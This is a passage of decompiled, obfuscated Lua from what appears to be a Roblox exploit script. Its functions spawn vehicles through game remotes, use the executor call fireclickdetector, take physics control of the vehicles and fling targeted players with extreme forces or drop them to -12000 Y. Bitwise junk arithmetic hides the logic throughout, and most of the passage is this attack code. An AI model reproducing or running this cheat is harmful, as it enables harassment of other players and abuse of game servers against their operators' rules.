		local v11 = table.pack(bit32.band(n8, 4294967295))
		local v12 = table.pack(bit32.band(v11[1], 65535))
		local n13 = 2656303982 + bit32.band(33599 * v12[1] + bit32.lshift(bit32.band(33599 * bit32.rshift(v11[1], 16) + 2350 * v12[1], 65535), 16), 4294967295)
		local v13 = table.pack(bit32.band(bit32.bnot(n8), 4294967295))
		local v14 = table.pack(bit32.band(v13[1], 65535))
		local v15 = bit32.band(33598 * v14[1] + bit32.lshift(bit32.band(33598 * bit32.rshift(v13[1], 16) + 2350 * v14[1], 65535), 16), 4294967295)
		local v16 = table.pack(bit32.band(magnitude, 4294967295))
		local v17 = table.pack(bit32.band(v16[1], 65535))
		local v18 = bit32.band(1951 * v17[1] + bit32.lshift(bit32.band(1951 * bit32.rshift(v16[1], 16) + 33991 * v17[1], 65535), 16), 4294967295)
		local v19 = table.pack(bit32.band(bit32.bnot(magnitude), 4294967295))
		local v20 = table.pack(bit32.band(v19[1], 65535))
		local n14 = n13 + v15 + v18 + bit32.band(1951 * v20[1] + bit32.lshift(bit32.band(1951 * bit32.rshift(v19[1], 16) + 33991 * v20[1], 65535), 16), 4294967295)
		flag2 = not v10
		local n15 = v8.Position + v8.CFrame.LookVector * n12 + Vector3.new(0, -5, 0)
		local n16 = n14 - 218088431
		local cframe = CFrame.Angles(0, math.rad(math.random(0, 360)) + 3.1415926535897931, 0)

		pcall(function()
			v2:SetPrimaryPartCFrame(CFrame.new(n15) * cframe)
		end)

		if tick() - now3 > 3.5 then
			upv7 = false
		end
	end)

	while upv7 and tick() - now3 < 4 do
		task.wait()
	end

	stopFling()
end

-- payload closure created 800-th (proto #t4068)
local function payload_fn_800(arg)
	local n2 = 339450994
	local n3 = 61937187
	local n4 = 87400586
	local flag = not arg
	local flag2

	if flag then
		flag2 = flag
	else
		flag2 = not upv1.Character
		n3 = n3 // 13 - 4237794508
	end

	if flag2 then
		return
	end
	local v = upv1
	local v2 = bit32.bxor(n2, 424491383)
	local character = v.Character
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end
	savedPosition = humanoidRootPart.Position

	pcall(function()
		humanoidRootPart.Anchored = true
		humanoidRootPart.CFrame = CFrame.new(Vector3.new(1181.83, 76.08, -1158.83))
		task.wait(0.2)
		humanoidRootPart.Velocity = Vector3.zero
		humanoidRootPart.RotVelocity = Vector3.zero
		humanoidRootPart.Anchored = false
		humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	end)

	task.wait(0.5)
	local v3 = pcall
	local v4 = table.pack(bit32.band(v2, 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local n5 = bit32.band(17870 * v5[1] + bit32.lshift(bit32.band(17870 * bit32.rshift(v4[1], 16) + 13083 * v5[1], 65535), 16), 4294967295) + 3315347718
	local v6 = table.pack(bit32.band(bit32.bor(v2, 510887429), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local v8 = bit32.band(47667 * v7[1] + bit32.lshift(bit32.band(47667 * bit32.rshift(v6[1], 16) + 52452 * v7[1], 65535), 16), 4294967295)
	local v9 = table.pack(bit32.band(bit32.band(v2, 510887429), 4294967295))
	local v10 = table.pack(bit32.band(v9[1], 65535))
	local n6 = n5 + v8 + bit32.band(47665 * v10[1] + bit32.lshift(bit32.band(47665 * bit32.rshift(v9[1], 16) + 52452 * v10[1], 65535), 16), 4294967295)

	v3(function()
		upv2.RE["1Ca1r"]:FireServer("DeleteAllVehicles")
	end)

	task.wait(0.2)

	pcall(function()
		upv2.RE["1Ca1r"]:FireServer("PickingCar", "TowTruck")
	end)

	task.wait(1.2)
	local vehicles = upv3:FindFirstChild("Vehicles")
	if not vehicles then
		upv4()
		return
	end
	local v11 = vehicles:FindFirstChild(upv1.Name .. "Car")
	if not v11 then
		upv4()
		return
	end
	local now = tick()

	local function fn()
		local seatPart = humanoid.SeatPart
		return seatPart and seatPart:IsDescendantOf(v11)
	end

	local vehicleSeat

	while true do
		vehicleSeat = v11:FindFirstChildWhichIsA("VehicleSeat", true) or v11:FindFirstChildWhichIsA("Seat", true)

		if vehicleSeat then
			if not fn(407168074, 52706848) then
				humanoid.Sit = false
				humanoidRootPart.CFrame = vehicleSeat.CFrame * CFrame.new(0, 2, 0)
				task.wait()

				pcall(function()
					vehicleSeat:Sit(humanoid)
				end)
			end

			if not fn(407168074, 172020793) then
				task.wait(0.1)
				if not (tick() - now > 10) then
					continue
				end
			end
		else
			task.wait(0.1)
			if not (tick() - now > 10) then
				continue
			end
		end

		break
	end

	if not vehicleSeat or not fn(407168074, 472813336) then
		upv4()
		return
	end
	upv5()
	local v12, v13, v14 = ipairs(v11:GetDescendants())
	local v15 = bit32.band(n4, n3)

	for _, v16 in v12, v13, v14 do
		if v16:IsA("BasePart") then
			v16.CanCollide = false

			pcall(function()
				v16:SetNetworkOwner(nil)
			end)

			task.wait()

			pcall(function()
				upv6:FireServer(v16, nil)
			end)
		end
	end

	upv7 = true

	if upv8 then
		upv8:Disconnect()
		upv8 = nil
	end

	upv8 = upv9.Stepped:Connect(function()
		if not upv7 then
			return
		end

		if upv1.Character then
			for _, descendant in ipairs(upv1.Character:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.CanCollide = false
				end
			end
		end
	end)

	flingConnection:Disconnect()
	flingConnection = nil
	local v16 = v15

	flingConnection = upv9.Heartbeat:Connect(function()
		local n7 = bit32.bxor(v16, 0) + 429615698
		local v17 = bit32.bxor(v16, 636891705)
		local n8 = 908661697
		local flag3 = not upv7
		local n9 = 8649826567
		if flag3 or not arg or not arg.Character then
			return
		end
		local character2 = arg.Character
		local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
		local v18 = bit32.bxor(n9, 145978317)
		local n10 = v17 - 4017801393
		local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart2 or not humanoid2 or not v11 or not v11.PrimaryPart then
			return
		end
		local unit = humanoid2.MoveDirection.Magnitude > 0.1 and humanoid2.MoveDirection.Unit or humanoidRootPart2.CFrame.LookVector
		local sin = math.sin
		local v19 = tick
		local v20 = bit32.bxor(n8, 2805596822)
		local n11 = humanoidRootPart2.Position + unit * 5 + Vector3.new(0, sin(v19() * 45) * 3.5, 0)

		pcall(function()
			v11:PivotTo(CFrame.new(n11, n11 + unit))
		end)

		local n12 = v20 // n10

		if (v11.PrimaryPart.Position - humanoidRootPart2.Position).Magnitude < 8 then
			if v11.PrimaryPart:FindFirstChild("ClientFlingForceTowTruck") then
				v11.PrimaryPart.ClientFlingForceTowTruck:Destroy()
			end

			local bodyVelocity = Instance.new("BodyVelocity")
			bodyVelocity.Name = "ClientFlingForceTowTruck"
			bodyVelocity.MaxForce = Vector3.new(1e9, 1e9, 1e9)
			bodyVelocity.P = 5000
			local vector_ = Vector3.new
			local n13 = math.random(-1000, 1000)
			local random = math.random
			local v21 = bit32.band(n10, n12)
			bodyVelocity.Velocity = vector_(n13, 7000, random(-1000, 1000))
			bodyVelocity.Parent = v11.PrimaryPart
		end
	end)
end

-- payload closure created 801-th (proto #t5523)
local function payload_fn_801(arg)
	local n2 = 503658922
	local n3 = 103337644
	local n4 = 3463404208
	local n5 = 246000658
	local flag = not arg
	local flag2

	if flag then
		flag2 = flag
	else
		flag2 = not arg.Character
		local v = table.pack(bit32.band(n5, 4294967295))
		local v2 = table.pack(bit32.band(v[1], 65535))
		local v3 = bit32.band(15060 * v2[1] + bit32.lshift(bit32.band(15060 * bit32.rshift(v[1], 16) + 5296 * v2[1], 65535), 16), 4294967295)
		local v4 = bit32.bxor(n5, 0)
		local v5 = table.pack(bit32.band(n4, 4294967295))
		local v6 = table.pack(bit32.band(v4, 4294967295))
		local v7 = table.pack(bit32.band(v5[1], 65535))
		local v8 = table.pack(bit32.rshift(v5[1], 16))
		local v9 = table.pack(bit32.band(v6[1], 65535))
		local v10 = bit32.band(v7[1] * v9[1] + bit32.lshift(bit32.band(v7[1] * bit32.rshift(v6[1], 16) + v8[1] * v9[1], 65535), 16), 4294967295)
		local v11 = table.pack(bit32.band(bit32.bor(n5, 152858194), 4294967295))
		local v12 = table.pack(bit32.band(v11[1], 65535))
		local v13 = bit32.band(50477 * v12[1] + bit32.lshift(bit32.band(50477 * bit32.rshift(v11[1], 16) + 60239 * v12[1], 65535), 16), 4294967295)
		local v14 = table.pack(bit32.band(bit32.band(n5, 152858194), 4294967295))
		local v15 = table.pack(bit32.band(v14[1], 65535))
		n5 = bit32.bxor(v3 + 1021964264 + v13 + bit32.band(50475 * v15[1] + bit32.lshift(bit32.band(50475 * bit32.rshift(v14[1], 16) + 60239 * v15[1], 65535), 16), 4294967295), 152858194)
		n4 = v10 + 4219255376
	end

	if flag2 or not upv1.Character then
		return
	end
	local character = upv1.Character
	local v

	if character then
		v = character
	else
		local characterAdded = upv1.CharacterAdded
		local n6 = n3 // bit32.bxor(n5, 0)
		local result2 = characterAdded:Wait()
		n3 = bit32.bxor(n6, 103337644)
		v = result2
	end

	local humanoid = v:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = v:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end
	savedPosition = humanoidRootPart.Position

	if humanoid.Sit then
		humanoid.Sit = false
		task.wait(0.5)
	end

	local airVehicleSpawner = workspace:FindFirstChild("AirVehicleSpawner")
	if not airVehicleSpawner or not airVehicleSpawner:FindFirstChild("Button") then
		warn("Spawner do Jet não encontrado!")
		return
	end
	local button = airVehicleSpawner.Button
	local n6 = n2 + 355815453
	humanoidRootPart.CFrame = button.CFrame + Vector3.new(0, 3, 0)
	task.wait(0.4)
	local clickDetector = button:FindFirstChildOfClass("ClickDetector")

	if clickDetector then
		fireclickdetector(clickDetector)
		print("ðŸ›« Menu de veículos aéreos aberto (Jet).")
		task.wait(1)
		local spawnVehicle = airVehicleSpawner:FindFirstChild("SpawnVehicle")
		local v2 = bit32.bxor(n5, 0)
		local v3 = bit32.band(n3, v2)

		if spawnVehicle then
			print(" Spawnando JetNormal via remote...")
			spawnVehicle:InvokeServer("JetNormal")
			local helicopters = workspace:WaitForChild("Helicopters")
			local jetNormal = nil

			for i = 1, 60 do
				jetNormal = helicopters:FindFirstChild("JetNormal")

				if jetNormal then
					print(" Jet spawnado com sucesso.")
					n5 = bit32.bxor(bit32.bxor(n5, 460554201), 460554201)
					break
				else
					task.wait(0.2)
				end
			end

			if not jetNormal then
				upv2()
				return
			end
			local pilotSeat = jetNormal:FindFirstChild("PilotSeat") or jetNormal:FindFirstChild("VehicleSeat")

			if not pilotSeat then
				warn(" Nenhum assento encontrado no Jet.")
				upv2()
				return
			end

			if not jetNormal.PrimaryPart then
				jetNormal.PrimaryPart = pilotSeat
				n4 = n4 // 8 - 1264488614
			end

			local n7 = 0

			while true do
				v:MoveTo(pilotSeat.Position + Vector3.new(0, 3, 0))
				task.wait(0.01)
				pilotSeat:Sit(humanoid)
				n7 += 1
				if not (humanoid.Sit or n7 > 100) then
					continue
				end
				break
			end

			if not humanoid.Sit then
				upv2()
				return
			end

			for _, descendant in ipairs(jetNormal:GetDescendants()) do
				local isBasePart = descendant:IsA("BasePart")
				local v4 = bit32.bxor(n5, 436394664)

				if isBasePart then
					descendant.CanCollide = false
					local v5 = table.pack(bit32.band(v4, 4294967295))
					local v6 = table.pack(bit32.band(v5[1], 65535))
					local v7 = bit32.band(50767 * v6[1] + bit32.lshift(bit32.band(50767 * bit32.rshift(v5[1], 16) + 43651 * v6[1], 65535), 16), 4294967295)
					local v8 = table.pack(bit32.band(bit32.bnot(v4), 4294967295))
					local v9 = table.pack(bit32.band(v8[1], 65535))
					local n8 = 3522989642 + v7 + bit32.band(50767 * v9[1] + bit32.lshift(bit32.band(50767 * bit32.rshift(v8[1], 16) + 43651 * v9[1], 65535), 16), 4294967295)

					pcall(function()
						descendant:SetNetworkOwner(nil)
					end)

					local function fn()
						upv3:FireServer(descendant, nil)
					end

					pcall(fn)
				end

				n5 = bit32.bxor(v4, 436394664)
			end

			local character2 = arg.Character or arg.CharacterAdded:Wait()
			local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
			local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart2 or not humanoid2 then
				upv2()
				return
			end
			local bodyForce = Instance.new("BodyForce", jetNormal.PrimaryPart)
			local new = Instance.new
			local BodyAngularVelocity = new("BodyAngularVelocity", jetNormal.PrimaryPart)
			BodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			BodyAngularVelocity.AngularVelocity = Vector3.new(5000, 25000, 5000)
			BodyAngularVelocity.P = 1e9
			upv4 = true

			upv6 = upv5.Stepped:Connect(function()
				if not upv4 then
					return
				end

				for _, descendant in ipairs(v:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end
			end)

			local n8 = 0
			local n9 = 5
			local n10 = 20
			local n11 = 35
			local n12 = 35
			local n13 = 50
			local now = tick()

			flingConnection = upv5.Heartbeat:Connect(function(deltaTime)
				local n14 = 144677535
				local n15 = 2573824160
				local n16 = 1308387796
				if not upv4 or not arg or not arg.Character or not jetNormal or not jetNormal.Parent then
					upv4 = false
					return
				end
				local v4 = arg
				local v5 = bit32.rshift(n16, 23)
				local character3 = v4.Character
				local humanoidRootPart3 = character3 and character3:FindFirstChild("HumanoidRootPart")
				character3 = character3 and character3:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart3 or not character3 or character3.Health <= 0 then
					upv4 = false
					return
				end
				n8 += deltaTime
				local v6 = n9
				local v7 = math
				local v8 = bit32.band(n15, v5)
				local n17 = n10 - n9
				local n18 = n14 + 189881135
				local n19 = v6 + v7.sin(n8 * 10) * n17 / 2
				local n20 = n13 * n8
				local n21 = math.cos(n20) * n19
				local n22 = math.sin(n20) * n19
				local n23 = humanoidRootPart3.CFrame.LookVector * math.sin(n8 * n12) * n11
				local n24 = 3498957466 + n18 + 5177468127
				local n25 = humanoidRootPart3.Position + Vector3.new(n21, 5, n22) + n23

				pcall(function()
					jetNormal:SetPrimaryPartCFrame(CFrame.new(n25, humanoidRootPart3.Position))
					bodyForce.Force = (humanoidRootPart3.Position - jetNormal.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * jetNormal.PrimaryPart:GetMass(), 0)
				end)

				if tick() - now > 10 then
					upv4 = false
				end
			end)

			while upv4 and tick() - now < 10 do
				task.wait()
			end

			stopFling()
			return
		end

		warn("Remote SpawnVehicle não encontrado!")
		return
	end

	warn("ClickDetector não encontrado.")
end

-- payload closure created 802-th (proto #t40)
local function payload_fn_802(arg)
	local n2 = 530101453
	local n3 = 2751515446
	local n4 = 160112584
	local flag = not arg
	local flag2

	if flag then
		flag2 = flag
	else
		flag2 = not arg.Character
		n4 = bit32.bxor(bit32.bxor(n4, 337059071), 337059071)
	end

	if flag2 or not upv1.Character then
		return
	end
	local character = upv1.Character or upv1.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	local flag3 = not humanoid
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n5 = bit32.band(40922 * v2[1] + bit32.lshift(bit32.band(40922 * bit32.rshift(v[1], 16) + 39563 * v2[1], 65535), 16), 4294967295) + 3868012566
	local v3 = table.pack(bit32.band(bit32.band(376035543, n2), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(49228 * v4[1] + bit32.lshift(bit32.band(49228 * bit32.rshift(v3[1], 16) + 51944 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.bxor(n2, 376035543), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n6 = n5 + v5 + bit32.band(24615 * v7[1] + bit32.lshift(bit32.band(24615 * bit32.rshift(v6[1], 16) + 25972 * v7[1], 65535), 16), 4294967295)
	if flag3 or not humanoidRootPart then
		return
	end
	savedPosition = humanoidRootPart.Position
	local sit = humanoid.Sit
	local v8 = bit32.bxor(n4, 0)

	if sit then
		humanoid.Sit = false
		task.wait(0.5)
	end

	local airVehicleSpawner = workspace:FindFirstChild("AirVehicleSpawner")
	if not airVehicleSpawner or not airVehicleSpawner:FindFirstChild("Button") then
		warn("Spawner do helicóptero não encontrado!")
		return
	end
	local button = airVehicleSpawner.Button
	humanoidRootPart.CFrame = button.CFrame + Vector3.new(0, 3, 0)
	task.wait(0.4)
	local clickDetector = button:FindFirstChildOfClass("ClickDetector")

	if clickDetector then
		fireclickdetector(clickDetector)
		print(" Menu de helicóptero aberto (Fling).")
		task.wait(1)
		local spawnVehicle = airVehicleSpawner:FindFirstChild("SpawnVehicle")

		if spawnVehicle then
			print(" Spawnando HelicopterPolice ")
			spawnVehicle:InvokeServer("HelicopterPolice")
			local helicopters = workspace:WaitForChild("Helicopters")
			local helicopterPolice = nil

			for i = 1, 60 do
				helicopterPolice = helicopters:FindFirstChild("HelicopterPolice")

				if helicopterPolice and helicopterPolice:FindFirstChild("hEL") then
					print(" Helicóptero spawnado com sucesso.")
					break
				else
					task.wait(0.2)
				end
			end

			if not helicopterPolice then
				upv2()
				return
			end
			local pilotSeat = helicopterPolice:FindFirstChild("PilotSeat")
			local v9

			if pilotSeat then
				v9 = pilotSeat
			else
				local vehicleSeat = helicopterPolice:FindFirstChild("VehicleSeat")
				v8 = bit32.bxor(bit32.band(v8, 4115271204), 142676424)
				v9 = vehicleSeat
			end

			local v10 = bit32.bxor(n4, 375457764)

			if not v9 then
				warn("⚠ï¸\u{8F} Nenhum assento encontrado (PilotSeat/VehicleSeat).")
				upv2()
				return
			end

			if not helicopterPolice.PrimaryPart then
				helicopterPolice.PrimaryPart = v9
			end

			local n7 = 0

			while true do
				character:MoveTo(v9.Position + Vector3.new(0, 3, 0))
				task.wait(0.01)
				v9:Sit(humanoid)
				n7 += 1
				if not (humanoid.Sit or n7 > 100) then
					continue
				end
				break
			end

			if not humanoid.Sit then
				upv2()
				return
			end

			for _, descendant in ipairs(helicopterPolice:GetDescendants()) do
				if descendant:IsA("BasePart") then
					local n8 = 439808508
					descendant.CanCollide = false

					pcall(function()
						descendant:SetNetworkOwner(nil)
					end)

					pcall(function()
						upv3:FireServer(descendant, nil)
					end)
				end
			end

			local character2 = arg.Character or arg.CharacterAdded:Wait()
			local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
			local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
			local flag4 = not humanoidRootPart2

			if not flag4 then
				flag4 = not humanoid2
				local v11 = bit32.band(n3, 709942472)
				local v12 = table.pack(bit32.band(v10, 4294967295))
				local v13 = table.pack(bit32.band(v12[1], 65535))
				local n8 = bit32.band(33720 * v13[1] + bit32.lshift(bit32.band(33720 * bit32.rshift(v12[1], 16) + 3542 * v13[1], 65535), 16), 4294967295) + 3283201576
				local v14 = table.pack(bit32.band(bit32.bor(v10, 499177123), 4294967295))
				local v15 = table.pack(bit32.band(v14[1], 65535))
				local v16 = bit32.band(31817 * v15[1] + bit32.lshift(bit32.band(31817 * bit32.rshift(v14[1], 16) + 61993 * v15[1], 65535), 16), 4294967295)
				local n9 = v8 + bit32.bxor(v10, 0)
				local v17 = table.pack(bit32.band(bit32.band(v10, 499177123), 4294967295))
				local v18 = table.pack(bit32.band(v17[1], 65535))
				v10 = bit32.bxor(n8 + v16 + bit32.band(31815 * v18[1] + bit32.lshift(bit32.band(31815 * bit32.rshift(v17[1], 16) + 61993 * v18[1], 65535), 16), 4294967295), 499177123)
				n3 = v11 + 2214593334
			end

			if flag4 then
				upv2()
				return
			end
			local bodyForce = Instance.new("BodyForce", helicopterPolice.PrimaryPart)
			local bodyAngularVelocity = Instance.new("BodyAngularVelocity", helicopterPolice.PrimaryPart)
			bodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyAngularVelocity.AngularVelocity = Vector3.new(5000, 25000, 5000)
			bodyAngularVelocity.P = 1e9
			upv4 = true

			upv6 = upv5.Stepped:Connect(function()
				if not upv4 then
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
					end
				end
			end)

			local n8 = n3 + bit32.bxor(v10, 0)
			local n9 = 0
			local n10 = 5
			local n11 = 20
			local n12 = 10
			local n13 = 8
			local n14 = 50

			flingConnection = upv5.Heartbeat:Connect(function(deltaTime)
				local v11 = bit32.bxor(n6, 3944759821)
				local n15 = 4183252270
				if not upv4 or not arg or not arg.Character or not helicopterPolice or not helicopterPolice.Parent then
					upv4 = false
					return
				end
				local character3 = arg.Character
				local humanoidRootPart3 = character3 and character3:FindFirstChild("HumanoidRootPart")
				local humanoid3 = character3 and character3:FindFirstChildOfClass("Humanoid")

				if not humanoidRootPart3 or not humanoid3 or humanoid3.Health <= 0 then
					upv4 = false
					return
				end

				if humanoid3.SeatPart then
					local cframe = CFrame.new(0, -12000, 0)

					for i = 1, 30 do
						local n16 = 496877973

						pcall(function()
							helicopterPolice:SetPrimaryPartCFrame(cframe)
							character:SetPrimaryPartCFrame(cframe)
							character3:SetPrimaryPartCFrame(cframe)
						end)

						task.wait()
					end

					if v9 then
						v9.Throttle = 0
						v9.Steer = 0
					end

					if helicopterPolice:FindFirstChild("BodyVelocity") then
						helicopterPolice.BodyVelocity.Velocity = Vector3.zero
					end

					local n16 = v11 - n15

					if helicopterPolice:FindFirstChild("BodyAngularVelocity") then
						helicopterPolice.BodyAngularVelocity.AngularVelocity = Vector3.zero
					end

					if humanoidRootPart.Position.Y < -1000 then
						humanoid.Sit = false
						task.wait(0.2)
						local n17 = 133599995
						humanoidRootPart.CFrame = CFrame.new(savedPosition)
						task.wait(0.2)

						pcall(function()
							if helicopterPolice and helicopterPolice.Parent then
								helicopterPolice:Destroy()
							end
						end)
					end

					upv4 = false
					return
				end

				n9 += deltaTime
				local n16 = n11 - n10
				local n17 = n10 + math.sin(n9 * 10) * n16 / 2
				local n18 = n14 * n9
				local n19 = math.cos(n18) * n17
				local n20 = math.sin(n18) * n17
				local n21 = humanoidRootPart3.CFrame.LookVector * math.sin(n9 * n13) * n12
				local n22 = humanoidRootPart3.Position + Vector3.new(n19, 5, n20) + n21

				pcall(function()
					helicopterPolice:SetPrimaryPartCFrame(CFrame.new(n22, humanoidRootPart3.Position))
					bodyForce.Force = (humanoidRootPart3.Position - helicopterPolice.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * helicopterPolice.PrimaryPart:GetMass(), 0)
				end)
			end)

			return
		end

		warn("Remote SpawnVehicle não encontrado!")
		return
	end

	warn("ClickDetector não encontrado.")
end

-- payload closure created 803-th (proto #t5938)
local function payload_fn_803(arg)
	local n2 = 506794645
	local n3 = 2316662126
	local n4 = 4279490983
	local n5 = 1925568752
	local n6 = 317812987
	if not arg or not arg.Character or not upv1.Character then
		return
	end
	local character = upv1.Character
	local v = bit32.bxor(n6, 0)
	local v2 = table.pack(bit32.band(n4, 4294967295))
	local v3 = table.pack(bit32.band(v, 4294967295))
	local v4 = table.pack(bit32.band(v2[1], 65535))
	local v5 = table.pack(bit32.rshift(v2[1], 16))
	local v6 = table.pack(bit32.band(v3[1], 65535))
	local v7 = bit32.band(v4[1] * v6[1] + bit32.lshift(bit32.band(v4[1] * bit32.rshift(v3[1], 16) + v5[1] * v6[1], 65535), 16), 4294967295)
	local result2 = character or upv1.CharacterAdded:Wait()
	local humanoid = result2:FindFirstChildOfClass("Humanoid")
	local humanoidRootPart = result2:FindFirstChild("HumanoidRootPart")
	if not humanoid or not humanoidRootPart then
		return
	end
	local position = humanoidRootPart.Position
	local v8 = table.pack(bit32.band(n2, 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n7 = bit32.band(18206 * v9[1] + bit32.lshift(bit32.band(18206 * bit32.rshift(v8[1], 16) + 16282 * v9[1], 65535), 16), 4294967295) + 586091844
	local v10 = table.pack(bit32.band(bit32.band(332101182, n2), 4294967295))
	local v11 = table.pack(bit32.band(v10[1], 65535))
	local v12 = bit32.band(29124 * v11[1] + bit32.lshift(bit32.band(29124 * bit32.rshift(v10[1], 16) + 32971 * v11[1], 65535), 16), 4294967295)
	local v13 = table.pack(bit32.band(bit32.bxor(n2, 332101182), 4294967295))
	local v14 = table.pack(bit32.band(v13[1], 65535))
	local n8 = n7 + v12 + bit32.band(47331 * v14[1] + bit32.lshift(bit32.band(47331 * bit32.rshift(v13[1], 16) + 49253 * v14[1], 65535), 16), 4294967295)
	savedPosition = position

	if humanoid.Sit then
		humanoid.Sit = false
		task.wait(0.5)
	end

	local airVehicleSpawner = workspace:WaitForChild("AirVehicleSpawner")
	if not airVehicleSpawner or not airVehicleSpawner:FindFirstChild("Button") then
		warn("Spawner do Chinook não encontrado!")
		return
	end
	local v15 = table.pack(bit32.band(n5, 4294967295))
	local v16 = table.pack(bit32.band(v7, 4294967295))
	local v17 = table.pack(bit32.band(v15[1], 65535))
	local v18 = table.pack(bit32.rshift(v15[1], 16))
	local v19 = table.pack(bit32.band(v16[1], 65535))
	local v20 = bit32.band(v17[1] * v19[1] + bit32.lshift(bit32.band(v17[1] * bit32.rshift(v16[1], 16) + v18[1] * v19[1], 65535), 16), 4294967295)
	local button = airVehicleSpawner.Button
	humanoidRootPart.CFrame = button.CFrame + Vector3.new(0, 3, 0)
	local v21 = table.pack(bit32.band(n6, 4294967295))
	local v22 = table.pack(bit32.band(v21[1], 65535))
	local n9 = bit32.band(42367 * v22[1] + bit32.lshift(bit32.band(42367 * bit32.rshift(v21[1], 16) + 14799 * v22[1], 65535), 16), 4294967295) + 214581041
	local v23 = table.pack(bit32.band(bit32.bor(n6, 267539279), 4294967295))
	local v24 = table.pack(bit32.band(v23[1], 65535))
	local v25 = bit32.band(46338 * v24[1] + bit32.lshift(bit32.band(46338 * bit32.rshift(v23[1], 16) + 35936 * v24[1], 65535), 16), 4294967295)
	local v26 = table.pack(bit32.band(bit32.bxor(n6, 267539279), 4294967295))
	local v27 = table.pack(bit32.band(v26[1], 65535))
	local n10 = v25 + bit32.band(42368 * v27[1] + bit32.lshift(bit32.band(42368 * bit32.rshift(v26[1], 16) + 14799 * v27[1], 65535), 16), 4294967295)
	local v28 = bit32.bor(v20, 1824004533)
	local n11 = n9 + n10
	task.wait(0.4)
	local clickDetector = button:FindFirstChildOfClass("ClickDetector")

	if clickDetector then
		fireclickdetector(clickDetector)
		print("ðŸ›« Menu de veículos aéreos aberto (Chinook).")
		task.wait(1)
		local tbl = { "ChinookAgency" }
		local v29 = bit32.bxor(n8, 371335671)
		local v30 = pcall

		local function fn()
			workspace:WaitForChild("AirVehicleSpawner"):WaitForChild("SpawnVehicle"):InvokeServer(unpack(tbl))
		end

		local v31 = bit32.bxor(n11, 476752428)
		v30(fn)
		local helicopters = workspace:WaitForChild("Helicopters")
		local chinookAgency = nil
		local n12 = v7 + 1829779930

		for i = 1, 60 do
			chinookAgency = helicopters:FindFirstChild("ChinookAgency")

			if chinookAgency then
				print("Chinook spawnado com sucesso.")
				break
			else
				task.wait(0.2)
			end
		end

		if not chinookAgency then
			upv2()
			return
		end
		local pilotSeat = chinookAgency:FindFirstChild("PilotSeat") or chinookAgency:FindFirstChild("VehicleSeat")

		if not pilotSeat then
			warn("Nenhum assento encontrado no Chinook.")
			upv2()
			return
		end

		if not chinookAgency.PrimaryPart then
			chinookAgency.PrimaryPart = pilotSeat
			v31 = bit32.bxor(bit32.bxor(v31, 79881016), 79881016)
		end

		local n13 = 0

		while true do
			result2:MoveTo(pilotSeat.Position + Vector3.new(0, 3, 0))
			task.wait(0.01)
			pilotSeat:Sit(humanoid)
			n13 += 1
			if not (humanoid.Sit or n13 > 100) then
				continue
			end
			break
		end

		if not humanoid.Sit then
			upv2()
			return
		end
		local v32, v33, v34 = ipairs(chinookAgency:GetDescendants())
		local v35 = table.pack(bit32.band(n12, 4294967295))
		local v36 = table.pack(bit32.band(v28, 4294967295))
		local v37 = table.pack(bit32.band(v35[1], 65535))
		local v38 = table.pack(bit32.rshift(v35[1], 16))
		local v39 = table.pack(bit32.band(v36[1], 65535))
		local v40 = bit32.band(v37[1] * v39[1] + bit32.lshift(bit32.band(v37[1] * bit32.rshift(v36[1], 16) + v38[1] * v39[1], 65535), 16), 4294967295)

		for _, v41 in v32, v33, v34 do
			if v41:IsA("BasePart") then
				v41.CanCollide = false
				local n14 = 1014345280

				pcall(function()
					v41:SetNetworkOwner(nil)
				end)

				pcall(function()
					upv3:FireServer(v41, nil)
				end)
			end
		end

		local character2 = arg.Character or arg.CharacterAdded:Wait()
		local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
		local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
		if not humanoidRootPart2 or not humanoid2 then
			upv2()
			return
		end
		local bodyForce = Instance.new("BodyForce", chinookAgency.PrimaryPart)
		local bodyAngularVelocity = Instance.new("BodyAngularVelocity", chinookAgency.PrimaryPart)
		bodyAngularVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bodyAngularVelocity.AngularVelocity = Vector3.new(6000, 30000, 6000)
		bodyAngularVelocity.P = 1e9
		upv4 = true

		upv6 = upv5.Stepped:Connect(function()
			if not upv4 then
				return
			end

			for _, descendant in ipairs(result2:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.CanCollide = false
				end
			end
		end)

		local n14 = 0
		local n15 = 8
		local n16 = 30
		local n17 = 45
		local n18 = 40
		local n19 = 70
		local now = tick()
		local v41 = v40

		flingConnection = upv5.Heartbeat:Connect(function(deltaTime)
